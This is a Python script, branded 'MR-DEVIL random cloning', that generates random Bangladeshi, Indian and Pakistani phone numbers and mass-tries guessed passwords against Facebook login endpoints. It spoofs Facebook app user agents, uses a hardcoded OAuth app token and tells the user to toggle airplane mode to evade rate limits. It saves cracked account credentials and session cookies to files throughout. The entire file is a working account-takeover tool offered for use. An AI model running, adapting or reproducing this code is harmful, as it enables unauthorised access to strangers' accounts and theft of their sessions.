#------------- import -------------#
import os
from os import system as clr
import random
import string 
from concurrent.futures import ThreadPoolExecutor as tred
import requests
import re
import sys
import uuid
import json
from bs4 import BeautifulSoup as bxx
import time


#-------------color----------------#
bblack="\033[1;30m"         # Black
M="\033[1;31m"            # Red
H="\033[1;32m"         # Green
byellow="\033[1;33m"        # Yellow
bblue="\033[1;34m"          # Blue
P="\033[1;35m"        # Purple
C="\033[1;36m"          # Cyan
B="\033[1;37m"         # White
my_color = [
 B,C,P,H]
warna = random.choice(my_color)
oks=[]
cps=[]
loop=0
#-------------logo-----------------#
logo=(f'''{B}
d8888b. d88888b db    db d888888b db      
88  `8D 88'     88    88   `88'   88      
88   88 88ooooo Y8    8P    88    88      
88   88 88~~~~~ `8b  d8'    88    88      
88  .8D 88.      `8bd8'    .88.   88booo. 
Y8888D' Y88888P    YP    Y888888P Y88888P                                           
{warna}--------------------------------------------{B}
 Owner    : {C}MR-DEVIL{B}
 Guthub   : MR-DEVIL
 Facebook : MIRAJ KHAN
 Tools    : {warna}{H}RANDOM CLONING{warna}{warna}
 Version  : {warna}{H}1.1{warna}{warna}
--------------------------------------------{B}''')
#-------------linex def -------------#
def linex():
    print(f'{warna}--------------------------------------------{B}')
#-------------clear def -------------#
def clear():
    clr('clear')
    print(logo)
#-------------main def------------#
def MR_ZISHAN():
    clear()
    print(f"join my Whatsapp Group...")
    time.sleep(2)
    os.system('xdg-open https://chat.whatsapp.com/LTBJe0upO8SIUsMXvHVAQd')
    clear()
    print(f'{B} [{warna}1{B}] BD RANDOM CLONING ')
    print(f'{B} [{warna}2{B}] IND RANDOM CLONING ')
    print(f'{B} [{warna}3{B}] PAK RANDOM CLONING ')
    print(f'{B} [{warna}0{B}] EXIT TERMINAL ')
    linex()
    option=input(f' {B}[{warna}??{B}] CHOICE MENU : ')
    if option in ['1','1']:
        BD_CLONING()
    if option in ['2','2']:
    	IND_CLONING()
    if option in ['3','3']:
    	PAK_CLONING()
    else:
        exit()
#------------- bd clone def ----------#
def BD_CLONING():
	clear()
	print(f"join my facebook group...")
	time.sleep(1)
	os.system('xdg-open https://www.facebook.com/groups/1324731081461934/?ref=share&mibextid=NSMWBT')
	clear()
	print(f'{B} [{warna}1{B}] Method  -M1 ')
	print(f'{B} [{warna}2{B}] Method  -M2 ')
	print(f'{B} [{warna}3{B}] Method  -M3 ')
	linex()
	option=input(f' {B}[{warna}??{B}] CHOICE METHOD: ')
	if option in ['1','1']:
		BD_M1_CLONING()
	if option in ['2','2']:
		BD_M2_CLONING()
	if option in ['3','3']:
		BD_M3_CLONING()
	else:
		exit()

def BD_M1_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : 016,017,018,019')
    code=input(' ENTER SIM CODE : ')
    linex()
    print(' EXAMPLE LIMIT : 1000, 2000, 5000, 10000')
    try:
        limit=int(input(' ENTER LIMIT : '))
    except ValueError:
        limit=10000000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as ZISHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN STARTED... ')
        print(' USE AIRPLAINE MODE EVERY 3 MINUITES ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'taniya','tabassum','bangladesh','mehedi','arafat','jannatul','shakib','alamin','shahin','sarmin','jannat']
            ZISHAN.submit(method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ZISHAN()
    
def BD_M2_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : 016,017,018,019')
    code=input(' ENTER SIM CODE : ')
    linex()
    print(' EXAMPLE LIMIT : 1000, 2000, 5000, 10000')
    try:
        limit=int(input(' ENTER LIMIT : '))
    except ValueError:
        limit=10000000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as ZISHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN STARTED... ')
        print(' USE AIRPLAINE MODE EVERY 3 MINUITES ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'taniya','tabassum','bangladesh','i love you','mehedi','sadiya','arafat','jannatul','shakib','saiful','shakil']
            ZISHAN.submit(m2method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ZISHAN()
def BD_M3_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : 016,017,018,019')
    code=input(' ENTER SIM CODE : ')
    linex()
    print(' EXAMPLE LIMIT : 1000, 2000, 5000, 10000')
    try:
        limit=int(input(' ENTER LIMIT : '))
    except ValueError:
        limit=10000000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as ZISHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN STARTED... ')
        print(' USE AIRPLAINE MODE EVERY 3 MINUITES ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'taniya','tabassum','bangladesh','i love you','mehedi','sadiya','arafat','jannatul','shakib','saiful','shakil']
            ZISHAN.submit(m3method_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ZISHAN()
def IND_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : +91602, +91729, +91880, +91950')
    code=input(' ENTER SIM CODE : ')
    linex()
    print(' EXAMPLE LIMIT : 1000, 2000, 5000, 10000...')
    try:
        limit=int(input(' ENTER LIMIT : '))
    except ValueError:
        limit=10000000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as ZISHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN STARTED... ')
        print(' USE AIRPLAINE MODE EVERY 3 MINUITES ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'57273200','59039200','kumar','57575751','i love you']
            ZISHAN.submit(indmethod_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ZISHAN()
    
def PAK_CLONING():
    user=[]
    clear()
    print(' EXAMPLE SIM CODE : 0306,0315,0335,0345')
    code=input(' ENTER SIM CODE : ')
    linex()
    print(' EXAMPLE LIMIT : 1000, 2000, 5000, 10000')
    try:
        limit=int(input(' ENTER LIMIT : '))
    except ValueError:
        limit=10000000
    clear()
    for nmbr in range(limit):
        nmp=''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as ZISHAN:
        tl=str(len(user))
        print(' TOTAL ACCOUNT : '+tl)
        print(' YOUR SIM CODE : '+code)
        print(' PROGRESS HAS BEEN STARTED... ')
        print(' USE AIRPLAINE MODE EVERY 3 MINUITES ')
        linex()
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'taniya','i love you','Ali khan','khan786','khankhan','khan1234','Baloch']
            ZISHAN.submit(pakmethod_crack,ids,passlist)
    linex()
    print(' THE PROGRESS HAS BEEN COMPLETE ')
    print(' TOTAL OK ID '+str(len(oks)))
    print(' TOTAL CP ID '+str(len(cps)))
    input(' PRESS ENTER TO BACK  : ')
    MR_ZISHAN()
    
def NADIF():
    and_verx = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    ver_code = str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana"])
    ua = f"[FBAN/FB4A;FBAV/{and_verx};FBBV/{ver_code};FBDM/"+"{density=2.0,width=720,height=1449}"+";FBLC/en_US;FBRV/{ver_code};FBCR/Robi;FBMF/Infinix;FBBD/Pop;FBPN/{str(fbs)};FBDV/X682C;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua
#------------ method crack def ---------#
def method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[DEVIL-M1] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': NADIF(),
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    break
                else:
                    print('\r\r \033[1;32m[DEVIL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/DEVIL-M1-COOKIES.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                    open('/sdcard/DEVIL-M1-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                open('/sdcard/DEVIL-M1-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass

def NADIFM2():
    and_verx = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    ver_code = str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    sim = random.choice(['airtel','Robi','Grameenphone','Banglalink'])
    smx = random.choice(['M2101K6G','M2101K6R','M1910F4G','M2103K19C','M2101K7AI'])
    ua = f"[FBAN/FB4A;FBAV/{and_verx};FBBV/{ver_code};FBDM/"+"{density=2.0,width=720,height=1449}"+";FBLC/en_US;FBRV/{ver_code};FBCR/{str(sim)};FBMF/Xiaomi;FBBD/Redmi;FBPN/{str(fbs)};FBDV/{str(smx)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua
def m2method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[DEVIL-M2] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': NADIFM2(),
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            url= 'https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    break
                else:
                    print('\r\r \033[1;32m[DEVIL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/DEVIL-M2-COOKIES.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                    open('/sdcard/DEVIL-M2-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                open('/sdcard/DEVIL-M2-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
def NADIFM3():
    and_verx = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    ver_code = str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    sim = random.choice(['airtel','Robi','Grameenphone','Banglalink'])
    smx = random.choice(['V2029','V2027','V2038','V2149','V2163A'])
    ua = f"[FBAN/FB4A;FBAV/{and_verx};FBBV/{ver_code};FBDM/"+"{density=2.0,width=720,height=1449}"+";FBLC/en_US;FBRV/{ver_code};FBCR/{str(sim)};FBMF/Vivo;FBBD/Vivo;FBPN/{str(fbs)};FBDV/{str(smx)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua
def m3method_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[DEVIL-M3] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': NADIFM3(),
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    break
                else:
                    print('\r\r \033[1;32m[DEVIL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/DEVIL-M3-COOKIES.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                    open('/sdcard/DEVIL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                open('/sdcard/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
def ZIKA():
    and_verx = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    ver_code = str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    #sim = random.choice(['airtel','Robi','Grameenphone'])#
    #smx = random.choice(['23076RN4BI','22041216I','22021211RC','M2103K19G','M2101K6G'])#
    ua = f"[FBAN/FB4A;FBAV/{and_verx};FBBV/{ver_code};FBDM/"+"{density=2.0,width=720,height=1449}"+";FBLC/uk_UA;FBRV/{ver_code};FBCR/airtel;FBMF/Samsung;FBBD/Samsung;FBPN/{str(fbs)};FBDV/SM-A525F;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua
#------------Ind method crack def ---------#
def indmethod_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[DEVIL-XD] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': ZIKA(),
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            url='https://b-graph.facebook.com/auth/login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    break
                else:
                    print('\r\r \033[1;32m[DEVIL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    open('/sdcard/DEVIL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                open('/sdcard/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
    
def pak():
    and_verx = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    ver_code = str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    sim = random.choice(['airtel','Jio','Telnor','Jazz','Robi'])
    smx = random.choice(['SM-G975F','Galaxy S20 Ultra','SM-A515F','SM-A205U',' SM-A107F','SM-A705FN','SM-A725F','SM-E625F','SM-G998B'])
    ua = f"[FBAN/FB4A;FBAV/{str(and_verx)};FBBV/{str(ver_code)};FBDM/"+"{density=2.0,width=720,height=1449}"+";FBLC/uk_UA;FBRV/{str(ver_code)};FBCR/{str(sim)};FBMF/Samsung;FBBD/Samsung;FBPN/{str(fbs)};FBDV/{str(smx)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    return ua
def pakmethod_crack(ids,passlist):
    global oks
    global cps
    global loop
    try:
        for pas in passlist:
            sys.stdout.write('\r\r \033[1;37m[DEVIL-XD] %s|\033[1;32mOK:%s'%(loop,len(oks)))
            sys.stdout.flush()
            adid=str(uuid.uuid4())
            device_id=str(uuid.uuid4())
            datax={
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'email': ids,
            'password': pas,
            'generate_analytics_claims': '1',
            'credentials_type': 'password',
            'source': 'login',
            'error_detail_type': 'button_with_disabled',
            'enroll_misauth': 'false',
            'generate_session_cookies': '1',
            'generate_machine_id': '1',
            'meta_inf_fbmeta': '',
            'currently_logged_in_userid': '0',
            'fb_api_req_friendly_name': 'authenticate'}
            header={'User-Agent': pak(),
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
            'X-FB-Connection-Type': 'unknown', 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger'}
            url='https://api.facebook.com/method/auth.login'
            reqx=requests.post(url,data=datax,headers=header).json()
            if 'session_key' in reqx:
                try:
                    uid=reqx['uid']
                except:
                    uid=ids
                ckkx=lock_check(uid)
                if ckkx =='LOCK':
                    break
                else:
                    print('\r\r \033[1;32m[DEVIL-OK] '+str(uid)+' | '+pas+'\033[1;37m')
                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
                    print('\033[1;32m [COOKIES] '+coki)
                    open('/sdcard/DEVIL-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                    oks.append(str(uid))
                    break
            elif 'www.facebook.com' in reqx['error_msg']:
                open('/sdcard/DEVIL-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
        
#---------checker------#
def lock_check(uid):
    sessionx=requests.Session()
    urlx=f'https://www.facebook.com/p/{uid}'
    req=bxx(sessionx.get(urlx).content,'html.parser')
    tx=req.find('title').text
    if tx =='Facebook':
        return('LOCK')
    else:
        return('LIVE')
#-------------end----------------#
MR_ZISHAN()